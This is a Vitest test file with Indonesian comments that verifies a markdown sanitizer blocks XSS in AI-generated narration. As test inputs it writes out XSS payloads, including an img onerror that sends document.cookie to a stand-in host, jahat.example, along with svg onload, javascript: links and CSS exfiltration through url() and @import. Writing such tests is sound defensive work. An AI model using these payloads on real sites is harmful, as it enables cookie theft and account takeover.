/**
 * @vitest-environment jsdom
 *
 * Tes safe-markdown — membuktikan XSS lewat narasi AI benar-benar tertutup.
 *
 * ⚠️ Lingkungan DOM dipilih dengan sengaja: `jsdom`.
 * DOMPurify membuang node berbahaya lalu MENG-CLONE anaknya ke induk dan
 * mengandalkan NodeIterator untuk memfilternya kembali. Pada happy-dom,
 * iterator tidak mengunjungi node hasil mutasi tersebut sehingga payload
 * bersarang tampak lolos:
 *     '<div><script>alert(1)</script></div>'  →  '<script>alert(1)</script>'
 * jsdom berperilaku sesuai spesifikasi DOM (sama seperti browser), sehingga
 * tes di sini mengukur perilaku yang benar-benar dialami pengguna.
 * Karena itu kita juga memakai KEEP_CONTENT: false — lihat safe-markdown.js.
 *
 * Konteks: narasi AI dirender dengan marked lalu disuntikkan ke innerHTML.
 * Sejak marked v5 opsi `sanitize` dihapus, sehingga HTML di dalam markdown
 * diteruskan apa adanya. Narasi AI dipengaruhi dokumen yang diunggah
 * pengguna (prompt injection), jadi ini jalur XSS tersimpan.
 */
import { describe, it, expect, vi, beforeEach } from 'vitest';

// DOMPurify memerlukan DOM; environment tes memakai happy-dom sehingga
// implementasi aslinya bisa dipakai (bukan mock).
const { safeMarkdown, safeHtml, escapeHtml } = await import('./safe-markdown.js');

describe('safe-markdown — XSS diblokir', () => {
  it('membuang <script>', () => {
    const out = safeMarkdown('Halo\n\n<script>alert(1)</script>\n\nSelesai');
    expect(out).not.toContain('<script');
    expect(out).not.toContain('alert(1)');
    expect(out).toContain('Halo');
    expect(out).toContain('Selesai');
  });

  it('membuang handler onerror pada gambar', () => {
    const payload = '<img src=x onerror="fetch(\'https://jahat.example/?c=\'+document.cookie)">';
    const out = safeMarkdown(payload);
    expect(out).not.toContain('onerror');
    expect(out).not.toContain('jahat.example');
  });

  it('membuang onclick dan atribut on* lainnya', () => {
    const out = safeMarkdown('<a href="#" onclick="steal()">klik</a>');
    expect(out).not.toContain('onclick');
    expect(out).not.toContain('steal()');
  });

  it('menetralkan href javascript:', () => {
    const out = safeMarkdown('[klik](javascript:alert(1))');
    expect(out.toLowerCase()).not.toContain('javascript:');
  });

  it('membuang <iframe>, <object>, <embed>, <form>', () => {
    const out = safeMarkdown('<iframe src="https://jahat.example"></iframe><object data="x"></object><form action="/x"><input name="a"></form>');
    expect(out).not.toContain('<iframe');
    expect(out).not.toContain('<object');
    expect(out).not.toContain('<form');
    expect(out).not.toContain('<input');
  });

  it('membuang <svg onload> (vektor XSS klasik)', () => {
    const out = safeMarkdown('<svg onload="alert(1)"><circle r="10"/></svg>');
    expect(out).not.toContain('onload');
    expect(out).not.toContain('<svg');
  });

  it('membuang atribut style (vektor CSS exfiltration)', () => {
    const out = safeMarkdown('<p style="background:url(https://jahat.example/x)">teks</p>');
    expect(out).not.toContain('style=');
    expect(out).not.toContain('jahat.example');
  });

  it('membuang <style> dan @import', () => {
    const out = safeMarkdown('<style>@import url("https://jahat.example/x.css");</style>teks');
    expect(out).not.toContain('<style');
    expect(out).not.toContain('@import');
  });
});

describe('safe-markdown — payload BERSARANG (regresi KEEP_CONTENT)', () => {
  it('membuang script yang bersarang di dalam tag terlarang', () => {
    const out = safeMarkdown('<div><script>alert(1)</script></div>');
    expect(out).not.toContain('<script');
    expect(out).not.toContain('alert(1)');
  });

  it('membuang input yang bersarang di dalam form', () => {
    const out = safeMarkdown('<form action="/x"><input name="a"></form>');
    expect(out).not.toContain('<form');
    expect(out).not.toContain('<input');
  });

  it('membuang param yang bersarang di dalam object', () => {
    const out = safeMarkdown('<object><param name="x"></object>');
    expect(out).not.toContain('<object');
    expect(out).not.toContain('<param');
  });

  it('membuang tabel yang bersarang di dalam div (profil strict)', () => {
    const out = safeMarkdown('<div><table><tr><td>1</td></tr></table></div>', { profile: 'strict' });
    expect(out).not.toContain('<table');
    expect(out).not.toContain('<td');
  });

  it('berlapis-lapis: script di dalam div di dalam div', () => {
    const out = safeMarkdown('<div><div><script>alert(1)</script></div></div>');
    expect(out).not.toContain('<script');
  });
});

describe('safe-markdown — format tetap berguna', () => {
  it('mempertahankan format markdown dasar', () => {
    const out = safeMarkdown('**tebal** dan *miring* dan `kode`');
    expect(out).toContain('<strong>tebal</strong>');
    expect(out).toContain('<em>miring</em>');
    expect(out).toContain('<code>kode</code>');
  });

  it('mempertahankan judul, daftar, dan tabel (dipakai laporan)', () => {
    const md = '## Judul\n\n- satu\n- dua\n\n| A | B |\n|---|---|\n| 1 | 2 |';
    const out = safeMarkdown(md);
    expect(out).toContain('<h2');
    expect(out).toContain('<ul>');
    expect(out).toContain('<table>');
    expect(out).toContain('<td>1</td>');
  });

  it('mempertahankan tautan https yang sah', () => {
    const out = safeMarkdown('[SNI](https://bsn.go.id)');
    expect(out).toContain('href="https://bsn.go.id"');
  });

  it('mempertahankan blok kode', () => {
    const out = safeMarkdown('```js\nconst a = 1;\n```');
    expect(out).toContain('<pre>');
    expect(out).toContain('<code');
    expect(out).toContain('const a = 1;');
  });

  it('mengembalikan string kosong untuk input kosong/null', () => {
    expect(safeMarkdown('')).toBe('');
    expect(safeMarkdown(null)).toBe('');
    expect(safeMarkdown(undefined)).toBe('');
  });

  it('profil strict hanya mengizinkan format teks', () => {
    const out = safeMarkdown('## Judul\n\n| A |\n|---|\n| 1 |', { profile: 'strict' });
    expect(out).not.toContain('<h2');
    expect(out).not.toContain('<table');
  });
});

describe('safe-markdown — penanganan input aneh', () => {
  it('tidak melempar error untuk markdown rusak', () => {
    expect(() => safeMarkdown('**tidak ditutup [tautan]( ')).not.toThrow();
  });

  it('menangani non-string tanpa error', () => {
    expect(() => safeMarkdown(12345)).not.toThrow();
    expect(() => safeMarkdown({ toString: () => '# judul' })).not.toThrow();
  });

  it('escapeHtml bekerja sebagai jaring terakhir', () => {
    expect(escapeHtml('<img src=x onerror=alert(1)>')).toBe(
      '&lt;img src=x onerror=alert(1)&gt;'
    );
  });
});

describe('safe-html — untuk HTML jadi', () => {
  it('menyisakan tag aman dan membuang yang berbahaya', () => {
    const out = safeHtml('<p>aman</p><script>jahat()</script>');
    expect(out).toContain('<p>aman</p>');
    expect(out).not.toContain('<script');
  });

  it('mengembalikan kosong untuk input kosong', () => {
    expect(safeHtml('')).toBe('');
    expect(safeHtml(null)).toBe('');
  });
});
